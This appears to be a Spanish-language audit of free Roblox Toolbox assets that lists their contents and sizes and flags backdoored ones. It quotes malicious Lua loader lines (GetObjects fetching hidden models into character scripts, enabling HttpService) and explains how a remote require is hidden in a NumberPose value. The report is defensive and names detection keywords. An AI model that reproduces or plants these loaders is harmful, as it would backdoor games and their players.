`local o=game:GetObjects("rbxassetid://122845407827531")[1]o:FindFirstChildWhichIsA("Folder",true).Parent=game:GetService("StarterPlayer").StarterCharacterScripts`

### Familia 3 — «Advanced Texture Streaming System v2.4.1» (healiattel, xw4m5, Japan City)

79665094662717, 82460675146164, 78188971759943, 114120925733217, 99043731526992, 93376997873263,
124865259344404, 130817699186912, 124581242124664, 130974691456028, 131247677717086, 78033796632460.

El mismo virus que en la 3ª tanda (pack «Bloxburg» y enchufe), escondido en un `ParticleEmitter`
llamado `VFXParticles`. Mete en pantalla un `TextBox` con este código (al revés en un atributo):

`local s=game:GetObjects('rbxassetid://131107691322943')[1] … s.Parent=d` (en el arma de xw4m5, el id
`103102799768392`, el mismo de la 3ª tanda): esconde un modelo en la carpeta **más profunda** del juego.

99043731526992 trae además un segundo: `game:GetObjects('rbxassetid://114706280708394')` en Workspace y
`game.HttpService.HttpEnabled = true`.

### Familia 4 — «SkyLink (Dont Remove)» / `LightConfig` «Written by @Quenty» (lun42386 y healiattel)

113349334619202, 122782784244668, 139484418601989, 95946642626421, 102765136165948, 113036863157630,
83730474928094, y también 79665094662717, 82460675146164, 131247677717086.

Se hace pasar por scripts viejos y conocidos de Quenty (EasyConfiguration, Type). Lo raro:
`require(script:WaitForChild("EasyConfiguration",5).Pose.Value)`. `Pose` es un `NumberPose` cuyo
`Value` es un **número de asset**: es un `require(número)` escondido para que los buscadores no lo vean.
El módulo `Type` además usa `MarketplaceService`. Puerta trasera clásica: carga código de fuera cada vez
que arranca el servidor.

### Familia 5 — «TextureConfigurationLoader … Made by @Retsatrophe» (Warpzaor68 y healiattel)

116641210728889, 107730003845316, 106442157390222, 111283915226740, 135266547724797, y también
78188971759943, 124581242124664 («CoreSkyboxSystem») y 93376997873263 («Protocol»).

Escondido en un `BloomEffect` llamado `BloomDefect.ExtraData.Shifter.PoseLink`. 13 000 caracteres de
relleno («texture management») y en medio: `require(script:WaitForChild("Pose", 6).Value)`, otra vez un
`require(número)` escondido en un `NumberPose`. En el cielo 135266547724797 ese `NumberPose` vale
**140312253726156** (comprobado en la última ejecución): es `require(140312253726156)`.

**Qué hacer**: no usar estos 32 assets ni copiar nada de ellos. Si alguno entra en el juego: borrarlo
entero y buscar `GetObjects`, `PlaneConstraint` con atributos, `NumberPose`, «CoreValidation»,
«SkyLink», «PoseLink», «VFXParticles», «Texture Streaming» y «TextureConfiguration». **Nunca** pegar en
la barra de comandos de Studio un código que salga en pantalla.

### Trampas del autor (no son virus)

- `Protector 2.0` en el **Turbo S** de 18577576400 (`Creator = "88nathan09266"`, lista `NotAllowed`,
  mensaje «boi not ur car»): bloquea el coche a todos menos al autor.
- Las copias 10897563593 y 10935800149 traen el `Protector 2.0` de SubXero_X (Skyline R34 y Supra MK3)
  que **mata** al que se sienta (ver 3ª tanda).

## Detalle por id

### Naturaleza

#### 114397068371248 — Foliage Pack (Ixcraz8397) ⛔

Carga: ✅. 44 `MeshPart` (43 con `SurfaceAppearance`), 1 `SunRaysEffect` falso. Talla total 72.2×47.8×62.1.

| Objeto | Talla | Mallas | Tris (media) |
|---|---|---|---|
| Palm Tree (palmera pequeña) | 7.9×15.4×7.9 | 6 | ~9 000 |
| Palm Tree (ancha y baja) | 12.6×11.6×24.0 | 4 (2 de hojas) | ~6 000 |
| Palm Tree (mediana) | 11.5×17.9×11.5 | 7 | ~10 500 |
| Palm Tree (grande, con helecho) | 18.7×27.2×16.1 | 5 | ~7 500 |
| Willow Tree (sauce) | 47.2×47.3×49.9 | 2 | ~3 000 |
| Bamboo | 17.4×12.6×15.5 | 1 | ~1 500 |
| Fern ×8 (helechos) | 2.8×3.1 … 7.2×4.3 | 1–2 | ~1 500 |
| Bush ×5 (arbustos) | 6.8×5.5 … 11.8×9.7 | 1 | ~1 500 |
| Swamp Plant ×3, Vines | 2.9×3.7 … 6.5×6.6 | 1 | ~1 500 |

(Tris por palmera: no se pueden leer; es la media del pack, 66 073 ÷ 44 ≈ 1 500 por malla.)
Las mallas son de otros: tronco y hojas de **Calgacos** (2017), **Some_Swan** (2019),
**bluebellnightt** (2020); sauce de Tazuk (2017). Virus: familia 1 (en el sauce).

#### 72475149726020 — Trees / Foliage Tropical, Jungle, Island (Ixcraz8397) ⛔

Carga: ✅. 102 `MeshPart` con 258 `Texture` antiguas (sin PBR), 10 `UnionOperation`. Talla 195.6×44.5×182.4.
10 grupos «Jungle Tree» (27×35 … 43×45×54), cada uno con 2–7 palmeras y arbustos. Solo hay **4 mallas**
distintas (hojas 1485915491, tronco 1485912779 de **Build2Brick**, 2018; Bush1 y Bush2 de HollowAurelius, 2017):

| Palmera | Talla | Mallas | Tris (media) |
|---|---|---|---|
| Palm Tree (alta) | 18.6×42.1×16.1 | 2 | ~3 100 |
| Palm Tree | 18.3×41.4×15.8 | 2 | ~3 100 |
| Palm Tree (ancha) | 26.8×38.8×23.1 | 2 | ~3 100 |
| Palm Tree | 21.3×30.8×18.4 | 2 | ~3 100 |
| Palm Tree | 13.0×29.5×11.3 | 2 | ~3 100 |
| Palm Tree (pequeña) | 8.7×19.8×7.6 | 2 | ~3 100 |
| Palm Tree (doble hoja) | 10.8×17.4×11.9 | 3 | ~4 700 |
| Palm2 | 19.1×33.1×16.5 | 1 malla + 1 Union (tronco) | ~1 600 |
| Palm2 (pequeña) | 14.0×24.2×12.1 | 1 + 1 Union | ~1 600 |
| Bush1 / Bush2 | 7.5×8.2×6.8 / 14.1×9.0×13.8 | 1 | ~1 600 |

(160 716 tris ÷ 102 mallas ≈ 1 600 por malla.) Virus: familia 1 (dentro de `Bark.Texture.Dependencies`).

#### 109211499509239 — Cherry Blossom Tree (Ixcraz8397) ⛔

Cerezo de 51.4×56.1×38.9: tronco (malla de MirrorI, 2017) + flores (EindaMorra, 2020) + 2 `ParticleEmitter`
de pétalos + alfombra de flores. Tiene un `Humanoid` y una animación «fLEAF» de **Hachi_OfficialBACK**
(no pública: no se movería). Virus: familia 1, escondido en el `Bone` de la animación.

#### 126164979250031 — Realistic tree (Ixcraz8397) ⛔

`BeechwoodTree_Var02` de 15.5×29.5×21.1 (2 mallas PBR: el haya del pack de naturaleza de Roblox).
Virus: familia 1 con `HttpEnabled`.

#### 116641210728889 — Realistic Campfire (Warpzaor68) ⛔

Hoguera de 6.9×4.1×6.7: 12 piedras, 27 palos (14 PBR), ceniza, `Fire`, `Smoke`, partícula de humo y un
sonido de fuego público (ProSoundEffects). Virus: familia 5.

### Edificios y ciudad

#### 79665094662717 — Realistic Japan City Pack (healiattel) ⛔

Carga: ✅. 98 piezas (78 `MeshPart`), talla 365.7×396.1×486.5. Mallas de **ZykoMizuki** (2021) con textura
en `TextureID` (sin PBR), material Concrete.

| Edificio | Talla | Mallas |
|---|---|---|
| Building #1 | 183.2×165.5×131.5 | 5 |
| Building #2 | 156.9×218.6×99.0 | 8 |
| Building #3 | 61.1×175.4×48.1 | 9 |
| Building #4 (rascacielos) | 109.2×396.1×162.4 | 6 (+2 Part) |
| Building #5 | 44.5×118.3×79.2 | 12 |

Además: 4 tramos de carretera (27.5×0.3×41.3, con `Texture`), una farola (8×16×1.5, `SpotLight`) y las 4
palmeras de 114397068371248. Virus: familia 3 (en la carretera) + familia 4 (`LightConfig`).

#### 139484418601989 — «City Sky Skyscraper Building Road View RP» (lun42386) ⛔

No hay edificios: es un `Sky` con la imagen 9813639156 (una **foto real de Tokio**) en atrás, delante,
izquierda y derecha, y 5614579544 (vacía) arriba y abajo. Más `SkyLink (Dont Remove)` = familia 4.

#### 111283915226740 — Polska Dom Mapa (Warpzaor68) ⛔

Casa de bloques de 63.6×28.6×77.5: paredes de `Part` (27×22×44, 9×22×28…), 10 ventanas `okno`, 2 puertas
`drzwi do modeli`, una silla de plástico, un `Trzepak` (barra de sacudir alfombras), agua y una verja de
malla con candado de 602 piezas. Nombres en polaco. Virus: familia 5.

#### 18777387875 — Barbados Gates (UNFINISHED) (dragonfox93246)

Carga: ✅. 3 144 piezas, 50 `MeshPart` (10 PBR), 74 Union, 16 scripts. Talla 189.6×26.4×169.3.
Entrada de urbanización: 2 puertas que se abren solas con un sensor (script de GalacticInspired),
muro, 4 farolas (`PointLight`), 5 bancos (`Seat`, animación vacía), 6 jardineras «Flower Bush Plants»
(14.8×3.2×4.4, **448 piezas cada una**), plantas en maceta, números, suelo y aceras de `Part`.
Scripts limpios (`qPerfectionWeld`, puertas, bancos). Decals: 8674195733, 8674197261, 27354909.

#### 16845477360 — Chernobyl Ferris Wheel (W1therEdBonn1e728)

Noria de 110.0×112.5×30.5: rueda (99.1×100.5×12), base, 18 cabinas de 11.6×10.0×10.8. 65 `MeshPart`,
sin scripts ni `SurfaceAppearance`. No gira.

#### 11188629897 — Elevator (Tubarao255)

No es un ascensor de edificio: es un **montacargas de obra** de 17.9×11.6×17.8 con valla de alambre
(676 alambres, 806 `SpecialMesh`), 4 cajas, una luz. Sin scripts: no se mueve.

#### 17536656565 — GM_Poolrooms_spaces kit / 13843689263 — backrooms level 0.01 kit (roblocs240487)

Decorados de terror *liminal* hechos con `Part` + `Texture`: baldosas amarillas y grises, agua con
flotación (script de TGazza, limpio), luces rosas (Poolrooms, 48.6×23.3×104.2); pasillos amarillos con
28 luces (Backrooms, 307.9×26.7×130.3). Limpios. No pegan en la ciudad.

#### 13583409363 — SCP-087 (W1therEdBonn1e728)

Escalera de 54×484×56 con 481 escalones, 2 886 `Texture`, 150 Decals de pared, 19 luces (una roja) y
números de piso. Sin scripts. Terror.

### Vehículos

#### 18577576400 — Realistic Car Pack (NOT MINE!) (dragonfox93246)

Carga: ✅ (con `CORTO`). 7 998 piezas: 5 066 `MeshPart`, 34 `SurfaceAppearance`, 1 733 `Texture`,
235 Decals, 518 sonidos, 1 501 scripts (A-Chassis 6 de //INSPARE). Talla 83.8×7.9×86.7.
Talla en studs. «Ruedas» y «cristales» por nombre/material (aproximado).

| Vehículo (nombre en el pack) | Talla | Piezas (MeshPart) | Carrocería | Ruedas | Cristales | Asientos |
|---|---|---|---|---|---|---|
| Supra Top Secret (Toyota) | 9.5×5.1×22.4 | 286 (125) | 9 | 11 | 22 | 4 |
| 718 GT4RS (Porsche) | 18.5×9.2×5.1 | 753 (541) | 10 | 4 | 6 | 7 |
| AM (Aston Martin) | 10.5×4.7×19.6 | 75 (70) | 0 | 8 | 8 | 1 |
| Jaguar F-Type | 9.9×5.6×18.8 | 154 (81) | 4 | 8 | 52 | 2 |
| 935/78 (Porsche) | 20.1×9.1×5.1 | 254 (180) | 10 | 50 | 52 | 7 |
| Skyline R34 (Nissan) | 8.1×5.1×19.5 | 349 (198) | 17 | 11 | 62 | 12 |
| 2018 Lamborghini Huracán Performante | 9.8×4.7×19.1 | 157 (84) | 0 | 0 | 17 | 2 |
| 5000 QV (Lamborghini Countach) | 8.9×5.0×16.8 | 237 (188) | 4 | 8 | 15 | 3 |
| 1994 Porsche 964 Speedster | 18.0×8.9×5.7 | 197 (128) | 33 | 16 | 59 | 6 |
| F1 | 19.1×9.1×5.5 | 279 (166) | 70 | 12 | 58 | 3 |
| 2002 Mazda RX-7 Spirit R | 17.5×8.6×4.8 | 359 (194) | 16 | 15 | 64 | 7 |
| Zenvo TS1 GT «Sleipnir» | 10.5×5.4×20.2 | 292 (243) | 67 | 42 | 26 | 16 |
| C7 (Corvette) | 17.8×8.5×5.4 | 219 (167) | 2 | 8 | 8 | 5 |
| Turbo S (Porsche) ⛔ | 19.5×9.6×5.6 | 319 (287) | 4 | 27 | 22 | 6 |
| Onyx Concept | 8.7×5.8×19.1 | 220 (161) | 4 | 4 | 10 | 4 |
| Veyron (Bugatti) | 9.8×5.8×23.2 | 199 (115) | 4 | 5 | 8 | 4 |
| 991.2 Turbo S (Porsche) | 8.8×5.2×17.8 | 284 (234) | 2 | 23 | 29 | 5 |
| Lexus LFA | 8.8×4.9×18.8 | 123 (123) | 28 | 17 | 17 | 3 |
| F430 16M Scuderia (Ferrari) | 9.1×5.1×17.8 | 178 (131) | 2 | 4 | 11 | 2 |
| Chevrolet Corvette ZR1 C6 2009 | 18.9×9.8×5.6 | 191 (147) | 17 | 4 | 26 | 2 |
| 2002 Enzo Ferrari | 9.5×5.7×19.1 | 368 (308) | 2 | 0 | 16 | 2 |
| 2014 Dodge Charger SRT8 | 6.5×10.4×22.1 | 97 (84) | 1 | 0 | 10 | 5 |
| Alfa Romeo 8C Spider | 11.1×5.9×20.4 | 74 (52) | 0 | 8 | 2 | 3 |
| F82 GTS (BMW M4) | 8.9×5.6×18.5 | 94 (79) | 0 | 8 | 9 | 3 |
| R33 (Nissan Skyline) | 19.0×8.9×5.4 | 322 (225) | 3 | 14 | 66 | 4 |
| 2008 Lamborghini Reventón | 11.1×5.9×22.4 | 146 (95) | 4 | 9 | 7 | 2 |
| 2015 Audi R8 W10P Hybrid | 19.2×10.3×6.3 | 1 772 (660) | 18 | 11 | 36 | 3 |

(Algunos están girados: la talla mayor sale en X en vez de Z.)

Marcas y logos ⚠: todos los nombres son marca y modelo reales. Logos en Decals: **Lamborghini**
(1488024160), **SRT 8** (187861811), **RX-7 «Spirit R»** (4531499999), **Z-tune** (2454083460, de Nismo),
un neumático con marca (289040701), pegatinas «Jurassic Park Stripe», «FeliTech Racing»; uno
**bloqueado** por Roblox (94458363). Mallas con nombre de marca: «Bugatti GS Vitesse Stock Wheel»,
«Brembo Caliper», «Vossen VFS-1», «yokohama», «badge».
Scripts: A-Chassis normal; `AudioPlayerScript` (radio con cualquier audio) en el RX-7; ⛔ `Protector 2.0`
en el Turbo S. Sonidos: muchos **no públicos** (motores de Chantilly_x, Nineafly…): no sonarían.
Las 748 piezas rojas son pilotos y agujas (no hay sangre).

#### 4573650411 — CHP pack (Xollare)

Carga: ✅. Dos copias casi iguales (una con piezas «Shiny» de más) de 3 coches. 1 008 piezas,
828 `MeshPart`, 292 scripts (A-Chassis + luces + sirena), 86 sonidos. 908 534 tris.

| Coche | Talla | Piezas (MeshPart) | Carrocería | Cristales | Asientos |
|---|---|---|---|---|---|
| CHP Charger (Dodge Charger patrulla) | 9.0×8.3×19.9 | 160 (129) | 2 | 29 | 5 |
| Explorer13 (Ford Explorer 2013) | 8.9×9.2×18.7 | 162 (132) | 0 | 17 | 6 |
| Crown Victoria V2 (Ford) | 8.9×7.0×21.3 | 195 (166) | 2 | 38 | 5 |

Ruedas: `Wheels/FL, FR, RL, RR` (con el Decal de neumático 289040701). Sirenas «CHP Wail / Yelp (LOUD)»
**públicas** (FireAlarmTech199); motor, arranque y bocina **no públicos**. Marcas: Dodge, Ford, «Go
Rhino Pushbar», y CHP (California Highway Patrol, policía real). Sin `require(número)` ni nada raro.

#### 97902046131324 — mesh pack (Teddy_FV)

Carga: ✅. 11 coches, 75 `MeshPart` sin scripts, textura en `TextureID` (sin PBR). Cada coche =
carrocería + interior/cristales + 4 ruedas sueltas (`wheel…`). Descripción: «im imported».

| Coche | Talla | Mallas | Ruedas |
|---|---|---|---|
| 206_4 (Peugeot 206) | 14.0×5.1×6.9 | 6 | 4 (2.3) |
| Hiace_9 (Toyota Hiace) | 15.6×6.4×7.6 | 6 | 4 (2.3) |
| Astra_19 (Opel Astra) | 14.8×4.8×6.6 | 6 | 4 (2.1) |
| Almera_39 (Nissan Almera) | 14.4×4.9×6.8 | 6 | 4 (2.3) |
| Avensis_14 (Toyota Avensis) | 17.0×5.6×7.2 | 6 | 4 (2.5) |
| AClass_34 (Mercedes Clase A) | 15.4×6.7×8.7 | 6 | 4 (2.8) |
| Vectra_49 (Opel Vectra) | 17.7×5.4×7.3 | 6 | 4 (2.5) |
| Golf_24 (Volkswagen Golf) | 16.4×5.7×7.9 | 6 | 4 |
| Volkswagen Sharan 1995 | 7.0×5.8×14.9 | 9 | — |
| sharan 2004 | 6.9×5.7×14.8 | 11 | — |
| nissan primera | 7.0×5.2×16.7 | 7 | 7 piezas de rueda |

Son pequeños para nuestra escala (un coche nuestro mide ~20): habría que escalarlos ×1.3. Los nombres
`Object_N` y `wheel.036_0` son de una exportación de Sketchfab: modelos reales con dueño desconocido.

#### 12110426279 — REALISTIC PACK (CDevChair)

Carga: ✅. 334 piezas, 326 `MeshPart` (178 mallas distintas), sin PBR. Talla 198.1×193.0×42.8.
Coches de **una sola malla**: Car 1 (15.3×7.6×5.8), Car 3, Car 4, Car 5 (7.2×5.1×17.1), Car 6, Car 8,
Hatchback 1 y 2, Truck 1 (9.7×9.6×24.2), Truck 2 (23.4×9.6×10.3), Frontloader (pala, 15.9×9.2×7.0).
Y props: 4 retretes de obra, 7 sillas de cafetería, taquillas largas, nevera, despensa, sofás, colchón,
almohada, archivadores, teclado, papeleras, bidones (`Oil Drum 001g`, nombre de Half-Life 2), caja de
madera, «Barrel Explosive», «Aid Crates», caseta de perro, extintor, pala, reloj, muñeca hawaiana.
Script: solo `qPerfectionWeld` (soldador de Quenty, limpio). Mallas de otros (ExecutiveKrab 2016…).

#### 8380605189 — realistic train pack (tcnorthcutt)

Carga: ✅ (con `CORTO`). 3 903 piezas (solo 54 `MeshPart`: casi todo `Part` y `Union`), 158 scripts
(acopladores, conducción, silbato, chimenea), 99 sonidos, 111 Decals. Talla 226.2×26.1×434.1.

| Vehículo | Talla | Piezas | Asientos |
|---|---|---|---|
| Lackawanna Heavyweight Coach (vagón de pasajeros) | 97.8×20.6×13.9 | 361 | 144 |
| PRR Heavyweight Coach | 97.8×20.6×13.9 | 401 | 108 |
| NYC Heavyweight Passenger Car | 97.8×20.6×13.9 | 399 | 108 |
| Room Car (coche cama) | 93.8×18.5×13.0 | 194 | 26 |
| Pullman American Baggage Car (furgón) | 97.8×21.6×13.8 | 125 | 0 |
| CN Boxcar (vagón cerrado) | 15.0×21.2×60.6 | 111 | 2 |
| S&N #213 (locomotora + ténder) | 96.9×20.5×14.4 | 370 | 6 |
| Big Boy (Union Pacific, locomotora articulada) | 18.6×24.0×162.4 | 519 | 6 |
| Strasburg #90 | 17.6×21.7×97.2 | 374 | 2 |
| PRR S1 Duplex #6100 | 26.1×150.9×16.0 | 402 | 4 |
| PRR T1 Duplex #5110 | 130.6×26.1×56.5 | 303 | 4 |
| Mount Rainier Scenic #5 | 86.7×19.9×14.0 | 344 | 4 |

Ruedas: `Truck` (bogies) y `Axle` (ejes de 9×4×4). Logos/nombres de compañías reales en Decals
(números de cabina, «CN», letreros). Sonidos: 35 **no públicos** (Metrotren, mooncat5972,
Trainman4…), 2 borrados por Roblox («[ Content Deleted ]»). Scripts limpios (sin `require(número)`).

#### 10887600145 — Mesh ##### steam train (tcnorthcutt)

2 `MeshPart` con textura: locomotora 20.4×25.2×84.1 y ténder 20.8×23.6×53.2. Sin scripts. Solo decorado.

#### 2161748423 — Realistic Mesh Track Pack / 8386763665 — Realistic long train track

Vías limpias y ligeras. 2161748423: TrackShort 15×2×15, TrackMedium 30×1.5×15, TrackLong 60×1.5×15,
TrackVeryLong 120×1.5×15, plataforma 145×1.5×145 y BumperTrack (tope, 11×7×11), material Concrete con
textura. 8386763665: 8 tramos «16 Long» de 16×2×16 (raíles de metal + balasto `Pebble` con textura),
128 studs en total.

#### 82136423205151 — Car Show Display (LiamH3ro45)

Plataforma de 17.8×22×22: base de 22×22, disco de 20×20 sobre `HingeConstraint` y un `SpotLight`
(brillo 5, alcance 60). Sin scripts y **sin virus** (el único limpio de LiamH3ro45).

#### 124865259344404 — Abandoned Truck 1 ⛔ / 130974691456028 — Realistic Box Truck ⛔ (healiattel)

Una malla cada uno: «AW International LC» (camión International oxidado, 9.8×9.6×24.0, malla de
terran975) y camión caja blanco 25.5×12.2×8.9 (malla de TCtully, 2016). Virus: familia 3.

#### 131247677717086 — Realistic Tires (healiattel) ⛔

1 `MeshPart` de 4×4×4: 4 neumáticos con llanta, apilados. Malla 12751306052 de DominikCzoo (2023), gris,
sin `TextureID` ni `SurfaceAppearance`. Virus: familias 3 y 4.

#### 18912826861 — Tap Bus (dragonfox93246)

Carga: ✅ solo con un volcado mínimo (el completo hace fallar la tarea). Talla 11.7×12.5×51.6.
`Body` (11.3×11.8×51.6, 866 objetos), `Wheels` (68 objetos, 2 ejes), `DriveSeat` (`VehicleSeat`),
47 `Seat`, `Misc`, `A-Chassis Tune`. 162 `MeshPart`, 154 Union, 88 `Texture`, 81 Decals, 44 sonidos,
97 scripts (A-Chassis 6 + plugins: luces, suspensión, cámara, radio). Un `StringValue`
«NombreParaMostrar» (hecho en español).
Logos: el Decal 15641588335 es el logo del **Transport Board** de Barbados (empresa pública real); 6 veces.
Scripts: 14 con `require(` (los de A-Chassis); no se han podido leer enteros. Ningún `getfenv`,
`loadstring`, `HttpService`, `GetObjects`, `string.char`, `Kick` ni `InsertService`.

#### 10897563593 / 10935800149 — «Car» y «Car Pack» (YouCanCallMeCouch5)

Mismo número de piezas, scripts, sonidos y mallas que 9432856072 de SubXero_X: los 30 vehículos de la
3ª tanda (Camry, Charger R/T, Skyline R34 ⛔, Supra MK3 ⛔, Silverado, GMC, autocaravanas, autobús
escolar D-700, camiones Astro…). Las animaciones de sentarse son de SubXero_X y no públicas. Ver
`docs/assets-usuario-3.md`.

### Cielos e iluminación

Todas las texturas de los cielos **cargan** (miniatura «Completed» en `thumbnails.roblox.com`).

| id | Cielo | Texturas | Sol/luna, estrellas | ¿Virus? |
|---|---|---|---|---|
| 102765136165948 | 11 cielos clásicos: Winterness, Walls Of Autumn, The Utter East, The Great West, Starry Night, Oblivion, John Tron (rejilla verde), Broken Sky, Alien Red, null_plainsky512 [2009-2013] y [2006-2009] | p. ej. Winterness 1327355-1327360, Starry Night 1014339-1014344 | por defecto | ⛔ familia 4 |
| 113036863157630 | verde oscuro tormentoso | 921881811, 921881907, 921881989, 921882045, 921882121, 921882259 | `CelestialBodiesShown=false`, 3 000 estrellas | ⛔ familia 4 |
| 135266547724797 | morado muy oscuro (la misma imagen 2245858419 en los 6 lados) | 2245858419 | sol y luna visibles | ⛔ familia 5 |
| 92375378852064 | degradado arcoíris pastel | 12877085497 (lados), 12877086914 (abajo), 12877083856 (arriba) | `SunAngularSize=11`, sin sol/luna | ⛔ familia 2 |
| 139484418601989 | foto de Tokio en 4 lados | 9813639156, 5614579544 | por defecto | ⛔ familia 4 |
| 93376997873263 | cielo azul con nubes reflejadas + `Atmosphere` (densidad 0.34, `Haze` 3.4) | 245710263, 245710630, 245710380, 245710319, 245710230, 245710496 | — | ⛔ familias 3 y 5 |
| 8294099223 | cielo azul con nubes y reflejo en el agua | 150335574, 150335585, 150335628, 150335620, 150335610, 150335642 | — | ✅ limpio |
| 14887624955 | gris oscuro (1014344 en los 6 lados) | 1014344 | — | ✅ limpio |

**8294099223 — Simple Lighting Pack** (Isley1111, sin scripts): `Atmosphere` (Density 0.3, Offset 0.25,
gris), `Bloom` (1 / 24 / 2), `ColorCorrection` (Contrast −0.05), `DepthOfField` (FarIntensity 0.19,
**FocusDistance 3.66, NearIntensity 0.75**: desenfoca todo lo que está a menos de ~14 studs; bajarlo),
`SunRays` (0.16 / 0.19). «You do not have to give credits».

**14887624955 — Realistic Horror Pack**: Lighting de terror (Atmosphere densa 0.435 color marrón,
Haze 10, Blur 2, DepthOfField, SunRays 0.25) + 72 losetas (12 paredes, 12 suelos, 12 cristales, 12
tejados, 12 terrenos, 12 techos) con `Texture` + puerta con `ClickDetector` (sonidos de gmhs2, no
públicos) + árbol que se mueve (script de TAWK1215) + `BobbingCamera` (cámara que se balancea). Limpio.

**9658188636 — REALISTIC PACK!**: 19 muebles de malla (mesa, PC, silla «pergolesi», silla…) +
«Realistic graphics»: ColorCorrection con tinte cálido, SunRays (1 / 2), Blur 1 y un script que pone
Ambient naranja (177, 94, 35), ClockTime 10 y niebla a 1 000. Limpio.

### Sonidos y animaciones

#### 131772048424194 — SCP:CB Footstep Sounds (xXCHARLIE_BOlXx)

Un `LocalScript` (para `StarterPack`) que cambia el sonido de los pasos según el material del suelo, y
25 `Sound` en un `SoundGroup`. Solo hay **5 audios distintos**, y **los 5 son públicos**:

| Audio | Nombre | Creador | Para |
|---|---|---|---|
| 137390607880889 | SCP:CB 2 Footstep 5 | zhernoseki12 | hormigón, ladrillo, madera, cristal, hielo, plástico… (16 materiales) |
| 136262802708360 | SCP:CB 2 Forest Footstep 2 | zhernoseki12 | hierba, arena, nieve, tela |
| 5676592633 | SCP Containment Breach - Metal Footstep 1 | stiveiso1747 | metal, chapa, aluminio, campo de fuerza |
| 145180175 | ladder4 | Elmuowo | escalar |
| 329997777 | Air Conditioner Sound | Siamosaurus | aire |

Script limpio. Los sonidos vienen del juego *SCP: Containment Breach* (licencia CC BY-SA 3.0: se pueden
usar dando crédito).

#### 14062245022 — SCP-096 / 8043394685 — SCP-096 animado (xXCHARLIE_BOlXx)

NPC de terror (18 mallas, 10.4×9.7×1.4) con scripts de Brutez que persiguen y matan, 11 animaciones de
kalegamersoneduh2 (no públicas) y 9 audios no públicos (uno «Gore DFX1», otro de *Silent Hill*).
8043394685: 5 copias de la malla del SCP-096 con `KeyframeSequence` y el audio «Hush» (público).

#### 8649374407 — Realistic Pack (xXCHARLIE_BOlXx)

Tiburones de una malla: Shortfin Mako (8.7×6.0×21.7), Thresher (7.1×4.7×16.7), White tip (6.3×4.5×11.7),
Hammerhead (8.4×7.7×21.1), Blue (7.1×4.2×12.6), White Shark (6.5×3.7×11.6) y otro. 4 llevan scripts
viejos que los mueven a saltos con `CFrame` y hacen burbujas. Personas de una malla (sin esqueleto):
«Young Japanese Woman», «Realistic Girl Sitting On A Chair», «mei», «Young Realistic Japanese Women's
Mom» (~2.4×7.6). Animales: «Realistic Dog» (4.0×5.6×5.0) y «rabbit». Sin virus. 200 252 tris.

#### 107730003845316 — Run Anim R6 (Warpzaor68) ⛔ / 113349334619202 — R15 Running Animation (lun42386) ⛔

Muñecos con `KeyframeSequence` (no `Animation` lista). La de R6 apunta a una animación de **Tengvang**
(no pública). Ambos con puerta trasera.

### Props

#### 130967743753364 — Realistic Autoservice Props Pack (NyrexBLX)

Carga: ✅. 103 `MeshPart` (72 PBR), sin scripts. Talla 34.9×13.3×38.0. Nombres `…_chunk1/2`
(partido en trozos al importar).

| Objeto | Talla (pieza mayor) | Mallas |
|---|---|---|
| Engine Crane (grúa de motor) | 8.4×6.7×8.4 | 6 |
| Generator (generador) | 9.7×13.3×14.7 | 4 |
| Workbench (banco de trabajo) | 11.5×8.3×2.7 | 24 |
| Toolchest (carro de herramientas) | 3.0×4.0×3.3 | 16 |
| Balancing Machine (equilibradora de ruedas) | 2.7×4.7×4.9 | 2 + 2 |
| Transmission Jack (gato de caja de cambios) | 3.7×4.9×3.5 | 10 |
| Car Jack (gato) | 1.5×5.6×3.1 | 2 |
| Steel Jack Stand ×3 (caballetes) | 1.2×2.1×1.1 | 5 |
| Compressor (compresor) | 2.2×3.3×4.4 | 2 |
| Oil Collector (recogedor de aceite) | 3.1×6.1×3.0 | 1 |
| Work Light Stand (foco con trípode) | 4.5×7.4×4.7 | 2 |
| Led Work Light ×2 | 1.5×1.4×1.4 | 5 |
| Car Creeper / Rolling Creeper (camillas) | 5.9×0.6×5.9 | 5 |
| Air Circulator (ventilador) | 2.1×2.8×2.7 | 5 |
| Fire Extinguisher (extintor) | 1.1×1.5×1.1 … 0.7×2.8×0.7 | 6 |
| Toolbox (caja de herramientas) | 1.8×1.0×1.1 | 4 |

Sin marcas. Mismo creador que el Factory Props Pack de la 3ª tanda.

#### 120631576642977 — Realistic Server Rack (W1therEdBonn1e728)

Armario 2.3×7.5×2.4 + puerta 2.1×7.2×0.1 + cristal + trasera + 11 servidores (2.0×0.3×2.1). PBR.
«Model by EntropyNine on Sketchfab».

#### 13188926423 — Bingus Particle Pack (CDevChair)

240 `Part` de 8×0.5×8, cada una con un `Decal`: Slash (47), Fog cluster, Dense fog, Small fog, Rain,
Snowflake, Leaf, Bubble, Fireworks, Spark, Lightning bolt, Star sparkle, Comet, Nebula, Wind swirl,
corazones, fantasma… Para copiar el id a un `ParticleEmitter`. Sin scripts.

#### 14800241387 — Model (CDevChair)

~40 armas de malla (SL7, Sako, DSR, M1 Garand, SVD, Mosin, FMG9, Luger, Sten, UMP45, MP5, Scorpion EVO,
M1911, Glock, Desert Eagle, Taurus Judge, P90, MG42, Vector, SPAS-12, Remington 870, granadas, karambit,
molotov, escudo…). El sonido «taurus_shoot» es del grupo **Bad Business**: sacadas de ese juego.

#### 115493232746766 — Realistic weapons pack ACS 2.01 (BACON_IQ0)

~80 armas para el sistema ACS (sin scripts: solo modelos y 1 060 sonidos). Lista: AK-74, AUG, Axon Taser,
Benelli M4, G2C, Glock 17/19/22/26, HK416 (5), M4A1 (4), M16A4, M249 (3), M240B, M27 IAR, M82A1, M107,
Kar98K, MP5 (4), Micro Uzi, Minigun, RPG-7, Riot Shield, katanas, granadas… y de juegos: Wingman, Kraber,
R-301, Hemlok, Flatline, Spitfire, G7 Scout (*Apex Legends*), OSIPR (*Half-Life 2*), Holger26, M13B,
STG-404, ODEN, MMC Confederal (*Call of Duty* / ciencia ficción).

#### 11877329379 — Realistic Texture Pack (W1therEdBonn1e728)

157 `Part` de muestra en carpetas con letrero (`SurfaceGui`): Bricks (9), Shingles (12), Carpet (14),
Tile (23), Glass (12), Interior Roofing (9), Plaster (6), Metal (4), Concrete (20), Landscape (12),
Wallpaper (3), Fabric (1), Wood (6). 775 `Texture` antiguas (sin PBR). Script: solo un «READ ME».
Las mismas imágenes que el Horror Pack 14887624955.

#### Los otros de lun42386 ⛔: 122782784244668, 95946642626421, 83730474928094

- **122782784244668 — Sun Glare**: una `ScreenGui` con 7 `ImageLabel` de destellos y un `LocalScript`
  «Flares» que los mueve según el sol.
- **95946642626421 — Infinite Terrain Generator**: un `Script` que crea terreno por trozos con ruido.
